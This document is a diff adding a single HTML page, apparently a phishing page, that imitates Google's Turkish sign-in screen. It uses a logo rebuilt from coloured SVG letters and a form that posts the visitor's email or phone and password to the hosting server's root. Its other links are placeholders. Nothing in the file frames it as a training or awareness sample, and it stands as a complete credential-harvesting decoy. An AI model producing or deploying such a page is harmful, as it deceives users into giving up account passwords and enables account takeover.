@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oturum Açın – Google Hesapları</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #f0f4f9;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            background: #fff;
+            border-radius: 28px;
+            padding: 48px 40px 36px;
+            width: 450px;
+            min-height: 500px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08), 0 4px 12px rgba(0,0,0,0.04);
+            display: flex;
+            flex-direction: column;
+        }
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .logo svg { width: 75px; height: 24px; }
+        .card h1 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        .card .subtitle {
+            text-align: center;
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+        .form-group { margin-bottom: 24px; position: relative; }
+        .form-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .form-group input:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+        .form-group label {
+            position: absolute;
+            left: 15px;
+            top: 14px;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s;
+        }
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
+            top: -8px;
+            left: 12px;
+            font-size: 12px;
+            color: #1a73e8;
+            background: #fff;
+            padding: 0 4px;
+        }
+        .forgot { margin-bottom: 28px; }
+        .forgot a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .forgot a:hover { text-decoration: underline; }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: auto;
+        }
+        .actions a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .btn-next {
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            letter-spacing: 0.25px;
+            transition: background 0.2s, box-shadow 0.2s;
+        }
+        .btn-next:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 3px rgba(26,115,232,0.4);
+        }
+        .info {
+            text-align: center;
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 32px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M0 19V5h2.6v14H0z" fill="#4285F4"/>
+                <text x="0" y="19" font-family="Google Sans,Roboto,Arial" font-size="22" font-weight="500" fill="#4285F4">G</text>
+                <text x="17" y="19" font-family="Google Sans,Roboto,Arial" font-size="22" font-weight="500" fill="#EA4335">o</text>
+                <text x="33" y="19" font-family="Google Sans,Roboto,Arial" font-size="22" font-weight="500" fill="#FBBC05">o</text>
+                <text x="49" y="19" font-family="Google Sans,Roboto,Arial" font-size="22" font-weight="500" fill="#4285F4">g</text>
+                <text x="64" y="19" font-family="Google Sans,Roboto,Arial" font-size="22" font-weight="500" fill="#34A853">l</text>
+                <text x="71" y="19" font-family="Google Sans,Roboto,Arial" font-size="22" font-weight="500" fill="#EA4335">e</text>
+            </svg>
+        </div>
+        <h1>Oturum açın</h1>
+        <p class="subtitle">Google Hesabınızı kullanın</p>
+        <form action="/" method="post">
+            <div class="form-group">
+                <input type="text" name="kullanici" placeholder=" " required autocomplete="off">
+                <label>E-posta veya telefon</label>
+            </div>
+            <div class="form-group">
+                <input type="password" name="sifre" placeholder=" " required>
+                <label>Şifre</label>
+            </div>
+            <div class="forgot">
+                <a href="#">Şifrenizi mi unuttunuz?</a>
+            </div>
+            <div class="actions">
+                <a href="#">Hesap oluştur</a>
+                <button type="submit" class="btn-next">İleri</button>
+            </div>
+        </form>
+        <p class="info">
+            Bu bir bilgisayar değilse, özel tarama penceresi kullanarak<br>
+            oturum açın. <a href="#" style="color:#1a73e8;">Daha fazla bilgi</a>
+        </p>
+    </div>
+</body>
+</html>
